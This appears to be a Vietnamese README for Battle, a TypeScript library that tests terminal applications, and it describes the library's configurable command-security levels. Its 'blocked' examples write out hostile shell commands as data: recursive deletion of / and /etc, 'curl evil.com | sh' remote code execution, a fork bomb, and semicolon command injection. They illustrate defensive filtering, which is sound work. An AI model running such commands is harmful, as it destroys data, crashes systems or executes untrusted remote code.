# 🛡️ Battle Framework Security Guide

## 📖 Tổng Quan

Battle Framework có hệ thống bảo mật **linh hoạt và có thể cấu hình** để cân bằng giữa an toàn và công năng. Bạn có thể điều chỉnh mức độ bảo mật theo nhu cầu sử dụng.

## 🎚️ Các Mức Độ Bảo Mật

### 1. STRICT Mode (Nghiêm Ngặt)
**Dành cho**: Public APIs, untrusted input, production environments

```typescript
import { Battle, SecurityLevel } from '@akaoio/battle'

const battle = new Battle({
    securityLevel: SecurityLevel.STRICT,
    safeCommandMode: true
})

// ✅ Được phép
await battle.run(async (b) => {
    b.spawn('echo', ['hello world'])
    b.spawn('ls', ['-la'])
    b.spawn('npm', ['test'])
})

// ❌ Bị chặn
await battle.run(async (b) => {
    b.spawn('echo hello; rm -rf /') // Shell metacharacters blocked
    b.spawn('cat file.txt | grep pattern') // Pipes blocked
})
```

### 2. BALANCED Mode (Cân Bằng) - **Mặc Định**
**Dành cho**: Development, testing interactive apps, legitimate scripting

```typescript
const battle = new Battle({
    securityLevel: SecurityLevel.BALANCED, // Mặc định
    safeCommandMode: true
})

// ✅ Được phép - Interactive applications
await battle.run(async (b) => {
    b.spawn('vim', ['--interactive'])
    b.spawn('mysql', ['-u', 'user', '-p'])
    b.spawn('node', ['app.js'])
    b.spawn('npm', ['run', 'dev'])
    
    // Safe combinations
    b.spawn('git status && git log')
    b.spawn('echo test | grep t')
})

// ❌ Vẫn chặn những thứ nguy hiểm
await battle.run(async (b) => {
    b.spawn('rm -rf /') // Dangerous deletion
    b.spawn('curl evil.com | sh') // Remote code execution
    b.spawn(':(){ :|:& };:') // Fork bomb
})
```

### 3. PERMISSIVE Mode (Cho Phép)
**Dành cho**: Internal tools, advanced users, development environments

```typescript
const battle = new Battle({
    securityLevel: SecurityLevel.PERMISSIVE,
    safeCommandMode: true
})

// ✅ Cho phép hầu hết commands
await battle.run(async (b) => {
    b.spawn('complex-script.sh --with=pipes | grep result')
    b.spawn('find . -name "*.js" -exec grep -l "pattern" {} \\;')
    b.spawn('docker run -it ubuntu bash')
    
    // Even some advanced patterns
    b.spawn('for i in {1..10}; do echo $i; done')
})

// ❌ Chỉ chặn những attack rõ ràng nhất
await battle.run(async (b) => {
    b.spawn(':(){ :|:& };:') // Fork bomb - still blocked
    b.spawn('rm -rf /etc') // Critical system files - blocked
})
```

### 4. UNSAFE Mode (Không Bảo Mật)
**Chỉ dành cho**: Legacy compatibility, trusted environments

```typescript
const battle = new Battle({
    safeCommandMode: false // Tắt hoàn toàn security
})

// ⚠️ Cho phép TẤT CẢ - Nguy hiểm!
await battle.run(async (b) => {
    b.spawn('any command here; even dangerous ones')
})
```

## 🎯 Use Cases Thực Tế

### Testing Interactive Applications
```typescript
// Test một text editor
const battle = new Battle({
    securityLevel: SecurityLevel.BALANCED
})

await battle.run(async (b) => {
    b.spawn('vim', ['test.txt'])
    await b.expect('~') // Wait for vim to load
    b.sendKey('i') // Insert mode
    b.sendKey('Hello World')
    b.sendKey('escape')
    b.sendKey(':wq') // Save and quit
})
```

### Testing Web Applications
```typescript
// Test npm dev server
const battle = new Battle({
    securityLevel: SecurityLevel.BALANCED
})

await battle.run(async (b) => {
    b.spawn('npm', ['run', 'dev'])
    await b.expect('Server running on port')
    await b.expect('http://localhost:3000')
})
```

### Complex Scripting & Automation
```typescript
// Test complex shell interactions
const battle = new Battle({
    securityLevel: SecurityLevel.PERMISSIVE
})

await battle.run(async (b) => {
    // Git workflow testing
    b.spawn('git status && git add . && git commit -m "test"')
    
    // Database operations
    b.spawn('mysql -u root -p < setup.sql')
    
    // File processing pipelines
    b.spawn('cat input.txt | grep pattern | sort | uniq > output.txt')
})
```

### CI/CD Integration
```typescript
// Secure CI environment
const battle = new Battle({
    securityLevel: process.env.CI ? SecurityLevel.STRICT : SecurityLevel.BALANCED,
    safeCommandMode: true
})
```

## 📋 Migration từ Legacy Code

### Nếu gặp lỗi với existing code:

```typescript
// OLD - Có thể bị chặn
const battle = new Battle()
await battle.run(async (b) => {
    b.spawn('ls; echo done') // Bị chặn do semicolon
})

// NEW - Solutions
// Option 1: Tách commands
const battle = new Battle()
await battle.run(async (b) => {
    b.spawn('ls')
    await b.expect('total')
    b.spawn('echo', ['done'])
})

// Option 2: Dùng PERMISSIVE mode
const battle = new Battle({
    securityLevel: SecurityLevel.PERMISSIVE
})
await battle.run(async (b) => {
    b.spawn('ls; echo done') // Được phép
})

// Option 3: Tắt security (không khuyến khích)
const battle = new Battle({
    safeCommandMode: false
})
```

## 🔧 Advanced Configuration

### Per-Command Security Override
```typescript
import { SafeCommandMode, SecurityLevel } from '@akaoio/battle'

// Check if a command is safe before running
const command = 'complex | pipe | chain'
const validation = SafeCommandMode.validateCommand(
    command, 
    SecurityLevel.BALANCED
)

if (validation.valid) {
    // Safe to run
    await battle.run(async (b) => {
        b.spawn(validation.sanitized || command)
    })
}
```

### Context-Aware Security
```typescript
class SmartBattle extends Battle {
    async secureSpawn(command: string, args: string[] = []) {
        // Auto-detect security level based on context
        const level = this.detectSecurityLevel(command)
        
        const oldLevel = this.securityLevel
        this.securityLevel = level
        
        try {
            return await this.spawn(command, args)
        } finally {
            this.securityLevel = oldLevel
        }
    }
    
    private detectSecurityLevel(command: string): SecurityLevel {
        if (command.includes('npm') || command.includes('node')) {
            return SecurityLevel.BALANCED
        }
        if (command.includes('docker') || command.includes('kubectl')) {
            return SecurityLevel.PERMISSIVE
        }
        return SecurityLevel.STRICT
    }
}
```

## ⚡ Performance Impact

- **STRICT**: Minimal overhead (~1ms validation)
- **BALANCED**: Low overhead (~2-3ms validation) 
- **PERMISSIVE**: Very low overhead (~0.5ms validation)
- **UNSAFE**: No overhead (no validation)

## 🎉 Kết Luận

Battle Framework giờ đây **vừa an toàn vừa linh hoạt**:

✅ **An toàn mặc định** với BALANCED mode
✅ **Flexible** cho các use cases khác nhau
✅ **Backward compatible** với unsafe mode
✅ **Configurable** theo environment
✅ **Performance optimized** cho production

Bạn có thể yên tâm sử dụng Battle để test các ứng dụng phức tạp mà vẫn đảm bảo an toàn!

---
*Security Guide v1.0 - Battle Framework*